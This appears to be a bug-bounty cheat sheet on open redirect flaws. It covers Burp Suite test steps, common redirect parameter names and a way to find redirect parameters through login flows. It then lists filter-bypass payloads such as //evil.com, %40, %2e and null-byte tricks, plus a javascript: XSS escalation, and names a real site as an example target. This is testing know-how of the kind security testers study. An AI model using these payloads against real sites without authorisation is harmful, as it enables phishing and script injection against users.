
Open Redirect
Open redirect happen when the web application takes an untrusted input and redrirects a user from the web application to untrusted site or resources that will
be used further for malicious purposes.
The impact for Open Redirect is usually low, unless you are using it to escalate other vulnerabilites.

Sometimes the application may have some security measures in place where the developers deefine a list of either trusted or untrusted resources.
In some cases, you may be able to bypass it, if you fully understand how it works.

Filetering and Bypasses.
----------------------------

https://example.com/login/?nextPage=https://google.com (allowed)

https://example.com/login/?nextPage=https://evil.com (not allowed)

https://example.com/login/?nextPage=https://evil.com/?google.com (allowed)

-->Test Case using Burp Suite:
1 Intercept the request and send to spider or just forward the request. 
2Go to target and site map module.
3.Add to scope the target.
4.Go to sitemap filter.
5.Check the 3xx filter and show scope items only.
6.If anything shown then send to repeater.
eg:
www.roche.com

/about/business/redirect/redirect-url-basic.jsp?redirect=index.jsp   --check on this param and status code 302

/about/business/redirect/redirect-url-basic.jsp?redirect=test.jsp

/about/business/redirect/redirect-url-basic.jsp?redirect=http://www.googl.com

https://www.roche.com/about/business/redirect/redirect-url-basic.jsp?redirect=http://www.attacker.com

If the redirection to your external url then the redirector is open and vulnerable.


-->Test case by Burp :
1 Intercept the request and send to spider or just forward the request. 
2Go to target and site map module.
3.Add to scope the target.
4.Go to sitemap filter.
5.Seach for parameters;
Relay State
Return Url
Redirect Uri
Return_url
Redirect
Redirect_url
Destination
Dest
Redir
Exit_url
Succes_URL
Forward Url
Forward Uri
Forward
url
q
https://www.openbugbounty.org/blog/tag/google-dorks/
etc..........

Redirect Status Code;
300 Multiple Choice
301 Moved Pemanantly
302 Found Redirection
303 See other
307 Temporary Redirect

-->Open Redirection Bypass Trick:
1.While finding a parameter just given above like https://victim.com/redirect?url=good.com
2.Attacker crafted a url https://victim.com/redirect?url=attacker.com shows responce 400 status code.
3.Attacker again crafted a subdomain www.victim.com.attacker.com
4.he added this to the website . https://victim.com/redirect?url=www.victim.com.attacker.com  shows a 302 status code
5.it will succesfully redirected to the www.victim.com.attacker.com website.
6.Due to bad regex it has been successfully bypass their protection.

-->A small trick to find Open Redirection if you couldn't find any Redirection parameters.
Steps:
  1. If the Applictaion have a user Sign-In/Sign-Up feature, then register a user and log in as the user.
  
  2. Go to your user profile page , for example : samplesite.me/accounts/profile
  
  3. Copy the profile page's URL
  
  4. Logout and Clear all the cookies and go to the homepage of the site.
  
  5. Paste the Copied Profile URL on the address bar 
  
  6. If the site prompts for a login , check the address bar , you may find the login page with a redirect parameter like the following
        - https://samplesite.me/login?next=accounts/profile
        - https://samplesite.me/login?retUrl=accounts/profile
  
  7. Try to exploit the parameter by adding an external domain and load the crafted URL
      eg:- https://samplesite.me/login?next=https://evil.com/
                     (or)
        https://samplesite.me/login?next=https://samplesite.me@evil.com/  #(to beat the bad regex filter)
  
  8. If it redirects to evil.com , thers's your open redirection bug.
   
  9. Try to leverage it to XSS
       eg:- https://samplesite.me/login?next=javascript:alert(1);//

Notes:
https://owasp.org/www-pdf-archive/OWASP_Appsec_Research_2010_Redirects_XSLJ_by_Sirdarckcat_and_Thornmaker.pdf
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt
https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt
https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/open-redirect.md


### Open redirect bypasses

- Simply try to change the domain

	**Example: ?redirect=https://example.com --> ?redirect=https://evil.com**

- Bypass the filter when protocol is blacklisted using `//`

	**Example: ?redirect=https://example.com --> ?redirect=//evil.com**

- Bypass the filter when double slash is blacklisted using `\\`

	**Example: ?redirect=https://example.com --> ?redirect=\\evil.com**

- Bypass the filter when double slash is blacklisted using `http:` or `https:`

	**Example: ?redirect=https://example.com --> ?redirect=https:example.com**

- Bypass the filter using `%40`

    **Example: ?redirect=example.com --> ?redirect=example.com%40evil.com**

- Bypass the filter if it only checks for domain name 

	**Example: ?redirect=example.com --> ?redirect=example.comevil.com**

- Bypass the filter if it only checks for domain name using a dot `%2e` 

	**Example: ?redirect=example.com --> ?redirect=example.com%2eevil.com**

- Bypass the filter if it only checks for domain name using a query/question mark `?` 

	**Example: ?redirect=example.com --> ?redirect=evil.com?example.com**

- Bypass the filter if it only checks for domain name using a hash `%23`

	**Example: ?redirect=example.com --> ?redirect=evil.com%23example.com**

- Bypass the filter using a `°` symbol	

	**Example: ?redirect=example.com --> ?redirect=example.com/°evil.com**

- Bypass the filter using a url encoded Chinese dot `%E3%80%82`

	**Example: ?redirect=example.com --> ?redirect=evil.com%E3%80%82%23example.com**

- Bypass the filter if it only allows you to control the path using a nullbyte `%0d` or `%0a`

	**Example: ?redirect=/ --> ?redirect=/%0d/evil.com**




https://smaranchand.com.np/2021/05/post-based-open-redirect-to-r-xss/
